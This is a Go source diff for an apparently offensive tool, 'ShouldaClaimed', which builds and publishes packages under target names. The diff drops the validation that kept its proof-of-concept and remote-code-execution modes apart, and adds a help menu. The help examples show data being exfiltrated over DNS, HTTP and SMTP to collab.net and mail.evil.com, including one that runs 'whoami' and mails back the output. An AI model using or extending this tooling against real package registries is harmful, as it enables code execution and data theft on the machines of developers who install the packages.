@@ -34,18 +34,19 @@ func ParseFlags(fs *flag.FlagSet, args []string) (*Config, error) {
 	fs.BoolVar(&cfg.Force, "f", false, "Force execution (skip existence checks)")
 	fs.BoolVar(&cfg.Force, "force", false, "Force execution (skip existence checks)")
 
+	// Custom Usage
+	fs.Usage = func() { PrintCustomUsage(fs) }
+
 	fs.Parse(args)
 
 	// Validation
 	if cfg.Target == "" {
 		return nil, fmt.Errorf("-t/--target is required")
 	}
-	if cfg.Poc == "" && cfg.Rce == "" {
-		return nil, fmt.Errorf("either -p/--poc or -r/--rce is required")
-	}
-	if cfg.Poc != "" && cfg.Rce != "" {
-		return nil, fmt.Errorf("cannot specify both -p and -r")
-	}
+	// Allow RCE + POC combination now.
+	// Only require at least one action if strictmode, but honestly defaults handle it.
+	// We'll just check Target is set.
+
 	if cfg.Poc != "" {
 		switch cfg.Poc {
 		case "dns", "http", "smtp":
@@ -56,6 +57,59 @@ func ParseFlags(fs *flag.FlagSet, args []string) (*Config, error) {
 	}
 
 	return cfg, nil
+}
+
+// PrintCustomUsage prints the styled help menu.
+func PrintCustomUsage(fs *flag.FlagSet) {
+	c := color.New(color.Bold)
+	c.Println("\nUsage:")
+
+	// Handle root usage vs subcommand usage name
+	name := fs.Name()
+	if name == "" {
+		name = "<command>"
+	}
+
+	fmt.Printf("  ShouldaClaimed %s [flags]\n", name)
+
+	c.Println("\nFlags:")
+	fs.VisitAll(func(f *flag.Flag) {
+		// Skip long versions in listing to keep it clean, or list manually
+		if len(f.Name) > 1 {
+			return
+		}
+		longName := ""
+		switch f.Name {
+		case "t":
+			longName = "--target"
+		case "p":
+			longName = "--poc"
+		case "r":
+			longName = "--rce"
+		case "s":
+			longName = "--server"
+		case "o":
+			longName = "--out"
+		case "f":
+			longName = "--force"
+		}
+
+		fmt.Printf("  -%s, %-10s %s\n", f.Name, longName, f.Usage)
+	})
+
+	c.Println("\nExamples:")
+	fmt.Println("  # DNS Exfiltration (Standard Info)")
+	fmt.Println("  ShouldaClaimed create -t pkg-name -p dns -s collab.net")
+
+	fmt.Println("\n  # RCE with SMTP Exfiltration (sends command output)")
+	fmt.Println("  ShouldaClaimed create -t pkg-name -p smtp -s mail.evil.com:25 -r \"whoami\"")
+
+	fmt.Println("\n  # HTTP Exfiltration")
+	fmt.Println("  ShouldaClaimed create -t pkg-name -p http -s http://collab.net")
+
+	fmt.Println("\n  # Publish with Force (Skip checks)")
+	fmt.Println("  ShouldaClaimed publish -t pkg-name -p dns -s collab.net -f")
+	fmt.Println("")
 }
 
 // formatBracketString colors only the text inside brackets.
